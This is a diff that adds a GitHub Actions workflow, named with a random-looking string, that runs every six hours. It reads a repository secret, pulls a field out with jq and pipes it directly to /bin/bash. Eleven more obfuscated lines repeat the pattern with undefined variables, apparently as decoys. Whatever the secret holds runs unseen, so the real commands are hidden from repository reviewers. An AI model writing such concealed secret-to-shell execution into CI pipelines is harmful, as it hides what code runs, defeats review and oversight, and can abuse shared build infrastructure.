@@ -1,0 +1,28 @@
+name: quyanjiu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: quyanjiu
+        env:
+          q26: ${{ secrets.q26 }}
+        run: |
+          echo $q26 | jq -r .jvhky5 | /bin/bash
+          echo $pqjhx8351 | jq -r .qry528 | /bin/bash
+          echo $evrw865 | jq -r .n68 | /bin/bash
+          echo $yctq464 | jq -r .eo5965 | /bin/bash
+          echo $oh4743 | jq -r .f83341 | /bin/bash
+          echo $iu16 | jq -r .fdjh88 | /bin/bash
+          echo $j56 | jq -r .wo442 | /bin/bash
+          echo $ifxuz16 | jq -r .ti7 | /bin/bash
+          echo $z38209 | jq -r .had997 | /bin/bash
+          echo $v40 | jq -r .bkkem3 | /bin/bash
+          echo $magy76 | jq -r .cwkx4 | /bin/bash
+          echo $pw0 | jq -r .k63 | /bin/bash
+
